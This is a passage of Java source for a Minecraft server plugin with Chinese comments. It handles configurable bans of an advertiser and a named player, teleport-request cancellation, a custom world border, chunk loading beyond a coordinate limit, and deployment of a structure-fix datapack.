            getLogger().info("已踢出宣传 4d4v.top 的玩家: " + player.getName());
        }
    }

    @EventHandler(priority = EventPriority.MONITOR)
    public void onPlayerJoin(PlayerJoinEvent event) {
        if (!getConfig().getBoolean(CONFIG_ANTICHEAT_BANBBQ, false)) return;
        Player player = event.getPlayer();
        if (player.getName().equalsIgnoreCase("smooth_BBQ")) {
            String ip = player.getAddress().getAddress().getHostAddress();
            Bukkit.getBanList(BanList.Type.IP).addBan(ip, "Banned by antiBBQ", null, "Console");
            Scheduler.runTask(this, () -> player.kickPlayer("§c你的 IP 已被封禁"));
            getLogger().info("已封禁 smooth_BBQ 的 IP: " + ip);
        }
    }

    @EventHandler
    public void onPlayerQuit(PlayerQuitEvent event) {
        // 处理 tpa 请求取消
        Player player = event.getPlayer();
        // 如果玩家是请求者，取消他发出的请求
        for (TpaRequest req : pendingRequests.values()) {
            if (req.requester.equals(player.getUniqueId())) {
                req.timeoutTask.cancel();
                Player target = Bukkit.getPlayer(req.target);
                if (target != null && target.isOnline()) {
                    target.sendMessage("§c发送者 §6" + player.getName() + " §c已离线，传送请求取消。");
                }
            }
        }
        // 如果玩家是目标，取消他收到的请求
        TpaRequest req = pendingRequests.remove(player.getUniqueId());
        if (req != null) {
            req.timeoutTask.cancel();
            Player requester = Bukkit.getPlayer(req.requester);
            if (requester != null && requester.isOnline()) {
                requester.sendMessage("§c目标玩家 §6" + player.getName() + " §c已离线，传送请求取消。");
            }
        }

        if (logViewers.remove(event.getPlayer())) {
            if (logViewers.isEmpty()) {
                removeLogHandler();
            }
        }
    }

    // ---------- 合并后的移动事件，同时处理边界和 TPA 取消 ----------
    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
    public void onPlayerMove(PlayerMoveEvent event) {
        Player player = event.getPlayer();
        Location to = event.getTo();
        if (to == null) return;
        World world = to.getWorld();
        if (world == null) return;

        // 先处理边界
        double x = to.getX();
        double z = to.getZ();
        double absX = Math.abs(x);
        double absZ = Math.abs(z);

        if (isWorldBorderEnabled(world)) {
            double diameter = getWorldBorderDiameter(world);
            double radius = diameter / 2.0;
            if (absX > radius || absZ > radius) {
                Location corrected = to.clone();
                if (absX > radius) corrected.setX(x > 0 ? radius : -radius);
                if (absZ > radius) corrected.setZ(z > 0 ? radius : -radius);
                player.teleport(corrected);
                player.sendMessage("§c你已到达世界边界！");
                return;
            }
        }

        if (absX >= HARD_LIMIT || absZ >= HARD_LIMIT) {
            int chunkX = to.getBlockX() >> 4;
            int chunkZ = to.getBlockZ() >> 4;
            Chunk chunk = world.getChunkAt(chunkX, chunkZ);
            if (!chunk.isLoaded()) chunk.load(true);
            if (isPaperServer()) {
                world.getChunkAtAsync(chunkX, chunkZ, (c) -> c.setForceLoaded(true));
            }
            final Location target = to.clone();
            Scheduler.runTask(IllegalStack.this, () -> {
                if (player.isOnline() && player.getWorld().equals(target.getWorld())) {
                    player.teleport(target);
                }
            });
        }

        // 然后处理 TPA 取消：检查是否真的移动了方块
        if (event.getFrom().getBlockX() == to.getBlockX() &&
            event.getFrom().getBlockY() == to.getBlockY() &&
            event.getFrom().getBlockZ() == to.getBlockZ()) {
            return; // 忽略视角移动
        }

        // 如果玩家是请求者，取消他发出的所有请求（通常只有一个）
        for (TpaRequest req : pendingRequests.values()) {
            if (req.requester.equals(player.getUniqueId())) {
                req.timeoutTask.cancel();
                pendingRequests.remove(req.target);
                Player target = Bukkit.getPlayer(req.target);
                if (target != null && target.isOnline()) {
                    target.sendMessage("§c发送者 §6" + player.getName() + " §c移动了，传送请求已取消。");
                }
                player.sendMessage("§c你移动了，传送请求已取消。");
                break; // 每个玩家只能有一个请求
            }
        }
    }

    @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = true)
    public void onPlayerTeleport(PlayerTeleportEvent event) {
        Player player = event.getPlayer();
        Location to = event.getTo();
        if (to == null) return;
        World world = to.getWorld();
        if (world == null) return;

        double x = to.getX();
        double z = to.getZ();
        double absX = Math.abs(x);
        double absZ = Math.abs(z);

        if (absX >= HARD_LIMIT || absZ >= HARD_LIMIT) {
            int chunkX = to.getBlockX() >> 4;
            int chunkZ = to.getBlockZ() >> 4;
            Chunk chunk = world.getChunkAt(chunkX, chunkZ);
            if (!chunk.isLoaded()) chunk.load(true);
            if (isPaperServer()) {
                world.getChunkAtAsync(chunkX, chunkZ, (c) -> c.setForceLoaded(true));
            }
        }
    }

    // ---------- 自定义世界边界相关方法 ----------
    public void setCustomWorldBorder(String worldName, double diameter) {
        String path = CONFIG_WORLDS + "." + worldName + ".diameter";
        getConfig().set(path, diameter);
        saveConfig();
        getLogger().info("世界 " + worldName + " 自定义边界已启用，直径: " + diameter);
    }

    public void disableCustomWorldBorder(String worldName) {
        String path = CONFIG_WORLDS + "." + worldName;
        getConfig().set(path, null);
        saveConfig();
        getLogger().info("世界 " + worldName + " 自定义边界已禁用。");
    }

    private boolean isWorldBorderEnabled(World world) {
        return getConfig().contains(CONFIG_WORLDS + "." + world.getName() + ".diameter");
    }

    private double getWorldBorderDiameter(World world) {
        return getConfig().getDouble(CONFIG_WORLDS + "." + world.getName() + ".diameter", -1);
    }

    // ---------- 数据包部署方法 ----------
    public void setShepherdHouseFix(boolean enable) {
        File worldFolder = Bukkit.getWorlds().get(0).getWorldFolder();
        File datapacksFolder = new File(worldFolder, "datapacks");
        File fixDatapackFolder = new File(datapacksFolder, "fix-snowy-shepherd-house");

        if (enable) {
            if (!fixDatapackFolder.exists()) {
                fixDatapackFolder.mkdirs();
                createPackMeta(fixDatapackFolder);
                File structureFolder = new File(fixDatapackFolder, "data/buidling_entrance/structures");
                structureFolder.mkdirs();
                File nbtFile = new File(structureFolder, "snowy_shepherds_house_1.nbt");
                try (InputStream in = getResource("snowy_shepherds_house_1.nbt")) {
                    if (in == null) {
                        getLogger().warning("修复文件 snowy_shepherds_house_1.nbt 未找到！请确认该文件已放入插件资源目录。");
                        return;
                    }
                    Files.copy(in, nbtFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
                    getLogger().info("雪地牧羊人小屋修复数据包已部署。请执行 /reload 或重启服务器生效。");
                } catch (IOException e) {
                    getLogger().log(Level.SEVERE, "无法复制修复文件", e);
                }
            } else {
                getLogger().info("修复数据包已存在，无需重复部署。");
            }
        } else {
            if (fixDatapackFolder.exists()) {
                deleteDirectory(fixDatapackFolder);
                getLogger().info("修复数据包已移除。请执行 /reload 或重启服务器生效。");
            }
        }
    }

    private void createPackMeta(File packFolder) {
        File mcmeta = new File(packFolder, "pack.mcmeta");
        String content = "{\n" +
                "  \"pack\": {\n" +
                "    \"pack_format\": 48,\n" +
                "    \"description\": \"Fix for snowy shepherd house\"\n" +
                "  }\n" +
                "}";
        try (FileWriter writer = new FileWriter(mcmeta)) {
            writer.write(content);
        } catch (IOException e) {
            getLogger().log(Level.SEVERE, "无法创建 pack.mcmeta", e);
        }
    }

    private void deleteDirectory(File dir) {
        File[] files = dir.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    deleteDirectory(file);
                } else {
                    file.delete();
                }
            }
        }
        dir.delete();
    }
}
